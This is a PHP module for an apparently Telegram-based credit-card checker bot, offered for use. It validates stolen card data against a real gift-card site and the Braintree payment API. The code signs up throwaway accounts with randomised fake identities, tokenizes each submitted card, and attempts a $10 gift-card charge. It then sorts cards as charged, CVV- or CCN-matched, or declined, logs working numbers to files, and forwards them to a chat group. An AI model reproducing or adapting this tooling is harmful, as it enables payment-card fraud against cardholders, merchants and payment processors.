<?php

#----------------------------------------------------------------------#
#   GATE: B3 AUTH + CHARGE (AMOUNT = $10)                              #
#   SITE: https://www.thelevelup.com/gift_cards/purchases/new          #
#----------------------------------------------------------------------#
$gate = "B3 Auth+Charge ($10)";


if ((strpos($message, "/bc") === 0) || (strpos($message, "!bc") === 0)){

  if (in_array($userId, $premium_users) === false){
  sendMessage($chatId, $premium_unauth_msg , $message_id);
  return;
  }

sendaction($chatId, "typing");
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }



//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Tools/functions/usefun.php";
//include "./Tools/functions/flagsgen.php";



//================ [ EXPLODE & LISTA ] ===============//
$lista = substr($message, 3);  
$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];

$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1; }

if (strlen($ano) == 2) $ano = "20$ano";
if (strlen($mes) == 1) $mes = "0$mes";

$first6 = substr($cc, 0, 6);
$last4 = substr($cc, 12, 4);
$lista = "$cc|$mes|$ano|$cvv";



//=============== [ Random User Details ] ==============//
$name   = ucfirst(str_shuffle('sushanta'));
$last   = ucfirst(str_shuffle('kumar'));

$serve_arr = array("gmail.com","hotmail.com","yahoo.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$name.".".$last."1".rand(000,999)."@".$serv_rnd."";
//$username = "".$name."".$last."".rand(1000,9999)."";
$pass = "".$name."@".rand(1000,9999)."";
//$phone = "917263".rand(1111,9999)."";
//$date = ''.date("20y-m-d").'';
$zip = "100".rand(10,56)."";

$rand = " $name - $last - $street - $city - $zip - $state - $email - $country - $date";

//echo "RAND:-".$rand."<hr>";



//==================[BIN LOOK-UP]======================//
$bin = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
curl_close($ch);
$bank = urlencode(GetStr($fim, '"bank":{"name":"', '"'));
$brand = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$level = GetStr($fim, '"brand":"', '"');
$name = GetStr($fim, '"name":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
//$benk = ucwords("$bank");

$bindata1 = " $bin | $brand | $type | $level | .$bank | $name ($emoji) ";
$bininfo = "$brand | $type | $level";
$cuntry = "$name ($emoji)";







$ip = "Live! ✅";
//================= [ CURL REQUESTS ] =================//

#--------------------[1th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.thelevelup.com/gift_cards/purchases/new?micro_site_name=proteinbar');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Accept-Language: en-GB,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Host: www.thelevelup.com';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'Sec-Fetch-Site: none';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$res1 = curl_exec($ch);
curl_close($ch);
$api_key = trim(strip_tags(getStr($res1,'name="api_key" id="api_key" value="', '"')));
$csrf = trim(strip_tags(getStr($res1,'name="csrf-token" content="', '"')));
$ctoken = trim(strip_tags(getStr($res1,'LevelUp.gift_cards.purchases.new("', '"')));
$getbearer = base64_decode($ctoken);
$bearer = GetStr($getbearer,'"authorizationFingerprint":"','"');

//echo "Client-token:-".$ctoken."<hr>";
//echo "Getbearer:-".$getbearer."<hr>"; 
//echo "Bearer:-".$bearer."<hr>";
//echo "Api_key:-".$api_key."<hr>";
//echo "CSRF:-".$csrf."<hr>";


#--------------------[2th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.thelevelup.com/v14/users');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: www.thelevelup.com';
$headers[] = 'Origin: https://www.thelevelup.com';
$headers[] = 'Referer: https://www.thelevelup.com/gift_cards/purchases/new?micro_site_name=proteinbar';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
$headers[] = 'X-CSRF-Token: '.$csrf.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"api_key":"'.$api_key.'","user":{"email":"'.$email.'","first_name":"'.$name.'","last_name":"'.$last.'","password":"'.$pass.'"}}');
$res2 = curl_exec($ch);
curl_close($ch);



#--------------------[3th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.thelevelup.com/v15/access_tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: www.thelevelup.com';
$headers[] = 'Origin: https://www.thelevelup.com';
$headers[] = 'Referer: https://www.thelevelup.com/gift_cards/purchases/new?micro_site_name=proteinbar';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
$headers[] = 'X-CSRF-Token: '.$csrf.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"access_token":{"api_key":"'.$api_key.'","password":"'.$pass.'","username":"'.$email.'"}}');
$res3 = curl_exec($ch);
curl_close($ch);
$access = trim(strip_tags(getStr($res3,'"token":"','"')));
//echo "Access Token:-".$access."<hr>";



#--------------------[5th REQ]--------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"'.SID().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"'.$zip.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$res5 = curl_exec($ch);
curl_close($ch);
$token = trim(strip_tags(getStr($res5,'"token":"','"')));
$ibank = ucwords(strtolower(trim(strip_tags(getStr($res5,'"issuingBank":"','"')))));
$icountry = trim(strip_tags(getStr($res5,'"countryOfIssuance":"','"')));
$bininfo1 = "$ibank - $icountry";




#--------------------[6th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.thelevelup.com/v15/credit_cards');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Authorization: token user="'.$access.'"';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: www.thelevelup.com';
$headers[] = 'Origin: https://www.thelevelup.com';
$headers[] = 'Referer: https://www.thelevelup.com/gift_cards/purchases/new?micro_site_name=proteinbar';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
$headers[] = 'X-CSRF-Token: '.$csrf.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"braintree_payment_nonce":"'.$token.'"}}');
$res6 = curl_exec($ch);
//curl_close($ch);
$msg = trim(strip_tags(getStr($res6,'"message":"','"')));




if((strpos($res6, 'success')) || (strpos($res6, '"promoted":true')) || (strpos($res6, '"state":"active"'))){
curl_close($ch);
#--------------------[7th REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.thelevelup.com/v15/users/gift_card_value_orders');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'Authorization: token user="'.$access.'"';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: www.thelevelup.com';
$headers[] = 'Origin: https://www.thelevelup.com';
$headers[] = 'Referer: https://www.thelevelup.com/gift_cards/purchases/new?micro_site_name=proteinbar';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
$headers[] = 'X-CSRF-Token: '.$csrf.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"gift_card_value_order":{"value_amount":1000,"web_purchase":true,"merchant_id":5585,"purchasing_for_self":true}}');
$res7 = curl_exec($ch);
$msg = trim(strip_tags(getStr($res7,'"message":"','"')));
}


$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);





//==================[Responses]======================//

if((strpos($res7, 'success')) || (strpos($res7, '"promoted":true')) || (strpos($res7, '"state":"active"'))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>CHARGED $10</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.urlencode($res7).'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/b3_ccc.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
sendMsg('-4077073881', "$fmsg");
}


elseif ((strpos($res7, 'error')) || (strpos($res7, '"error":'))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>『 ★ Auth: Pass ★ 』</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/b3_cvv.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
//sendMsg('-759065711', "$fmsg");
}


elseif ((strpos($res6, 'Postal code is incorrect')) || (strpos($res6, '"message":"Postal code is incorrect"'))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>AVS Mismatch</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/b3_cvv.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
sendMsg('-4077073881', "$fmsg");
}


elseif ((strpos($res6, 'Insufficient Funds')) || (strpos($res6, 'Code:2001'))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>CVV MATCHED</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/insuff.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
}


elseif ((strpos($res6, 'Card Issuer Declined CVV')) || (strpos($res6, 'Code:2010'))){
$tmsg = '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>CCN MATCHED</b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>';

sendMessage($chatId, ''.$tmsg.'', $message_id);
file_put_contents('Others/Save/ccn.txt', $lista.PHP_EOL , FILE_APPEND | LOCK_EX);

$fmsg = '<b>╭─━━━━━━━━━━━━━━━━─╮%0A      BOT%0A╰─━━━━━━━━━━━━━━━━─╯</b>%0A%0A'.$tmsg.'';
sendMsg('-4077073881', "$fmsg");
}



elseif ((strpos($res6, 'error')) || (strpos($res6, '"error":'))){
sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.$msg.'</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>', $message_id);
}

else{
sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b>ERROR! </b>❌ %0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i>'.urlencode($res6).'- [MSG: '.$msg.']</i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[raven_ccs]</a>', $message_id);
}




curl_close($ch);
unlink("cookies.txt");
ob_flush();
}

//====================[Stripe Inline Charge]=====================//

?>